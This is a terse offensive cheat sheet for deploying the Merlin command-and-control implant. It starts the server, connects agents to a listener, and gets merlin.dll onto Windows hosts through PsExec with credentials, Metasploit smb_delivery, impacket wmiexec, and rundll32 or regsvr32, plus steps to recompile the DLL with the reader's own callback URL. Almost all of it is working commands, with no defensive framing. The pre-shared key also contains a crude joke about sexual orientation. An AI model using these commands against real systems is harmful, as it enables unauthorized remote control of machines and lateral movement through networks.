## MERLIN SERVER
`go run main.go -i <HOST: 0.0.0.0>  -p 8443 -psk BIGgayPASSWORD`

## Connect via agent 
```
merlinagent.exe -url https://104.197.205.200:8443 -psk BIGgayPASSWORD
```
```
C:\Users\Bob\Downloads>C:\WINDOWS\System32\rundll32.exe merlin.dll,Run https://192.168.1.100:443/
```
# PSExec method
`PS C:\SysinternalsSuite>.\PsExec.exe \\192.168.1.10 -u bob -p password -d -c C:\merlin\data\bin\windows\merlinAgent.exe -url https://192.168.1.100:443/`
## SMB Delivery via Metasploit
```
msf > use windows/smb/smb_delivery
msf exploit(windows/smb/smb_delivery) > set FILE_NAME merlin.dll
msf exploit(windows/smb/smb_delivery) > set EXE::Custom /opt/merlin.dll
msf exploit(windows/smb/smb_delivery) > set DisablePayloadHandler true
msf exploit(windows/smb/smb_delivery) > set VERBOSE true
msf exploit(windows/smb/smb_delivery) > run
[*] Run the following command on the target machine:
[*] Using custom payload /opt/merlin.dll, RHOST and RPORT settings will be ignored!
rundll32.exe \\192.168.1.100\WxlV\merlin.dll,0[*] Run the following command on the target machine:
[*] Using custom payload /opt/merlin.dll, RHOST and RPORT settings will be ignored!
rundll32.exe \\192.168.1.100\WxlV\merlin.dll,0
```
 - You gotta change the 0 to run (at the end) and provide URL of listening server
 - one way to access this file now is (impacket):
```
python wmiexec.py bob:password@192.168.1.10
C:\>rundll32.exe \\192.168.1.100\WxlV\merlin.dll,Run https://192.168.1.100:443/
```
# Compile your boys via (in go/src/github/ne0ndog/merlin):
make windows
## Compile DLL (change default URL to your own)
```
sed -i 's_https://127.0.0.1:443/_https://192.168.1.100:443/_' main.go
make
```
and execute it:
```
# rundll32.exe examples:
rundll32.exe merlin,main
rundll32.exe merlin,Run
# regsvr32.exe examples:
regsvr32.exe /s merlin.dll
regsvr32.exe /s /u merlin.dll
regsvr32.exe /s /n /i merlin.dll
```
